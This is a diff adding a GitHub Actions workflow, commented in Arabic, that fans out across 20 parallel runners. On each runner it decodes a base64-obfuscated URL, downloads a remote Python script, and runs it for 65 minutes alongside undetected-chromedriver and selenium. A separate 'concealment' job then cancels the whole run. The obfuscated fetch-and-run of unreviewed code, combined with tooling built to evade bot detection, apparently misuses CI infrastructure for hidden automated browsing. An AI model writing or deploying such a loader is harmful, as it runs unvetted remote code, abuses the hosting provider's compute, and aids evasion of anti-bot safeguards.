@@ -1,0 +1,107 @@
+name: Linux Centered Task Company
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: centered-company-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مُشرف الإخفاء الشامل: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  concealment-curator:
+    name: "Concealment Curator"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Proclaim Full Concealment Edict
+        run: |
+          echo "[CURATOR] Concealment curator in session. Complete concealment armed at the 65-minute watermark."
+          echo "[CURATOR] Auditing workflow seal: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[CURATOR] Watermark attained! Proclaiming full concealment edict..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[CURATOR] Full concealment edict proclaimed. Every operational and reserved unit will be concealed."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات السرية
+  # =================================================================
+  compose-company:
+    name: "CompanyUnit-${{ matrix.unit_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_code: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      # ⊢ الطور الأول: تحضير الأرضية الأولية
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      - name: Ready Primary Ground
+        run: |
+          echo "[READY] Ready primary ground for CompanyUnit-${{ matrix.unit_code }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      # ⊢ الطور الثاني: تحرير الملف التنفيذي
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      - name: Liberate Execution Document
+        run: |
+          echo "[LIBERATE] Liberating app_task.py from designated distribution gateway..."
+          DISTRIBUTION_GATEWAY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DISTRIBUTION_GATEWAY" -o app_task.py
+          echo "[LIBERATE] Execution document liberated successfully."
+
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      # ⊢ الطور الثالث: تضمين المكتبات المساندة
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      - name: Embed Auxiliary Libraries
+        run: |
+          echo "[EMBED] Embedding auxiliary libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      # ⊢ الطور الرابع: التنفيذ المُستَر بالمدة (65 دقيقة)
+      # ❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉❉
+      - name: Perform Sheltered Operation
+        run: |
+          echo ">> Composing CompanyUnit-${{ matrix.unit_code }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          COMPANY_PID=$!
+          
+          echo ">> Sheltered operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $COMPANY_PID 2>/dev/null; then
+            echo ">> Sheltered window elapsed! Retiring operation..."
+            kill -9 $COMPANY_PID
+            echo ">> Operation retired by shelter keeper."
+          else
+            echo ">> Operation closed within sheltered window."
+          fi
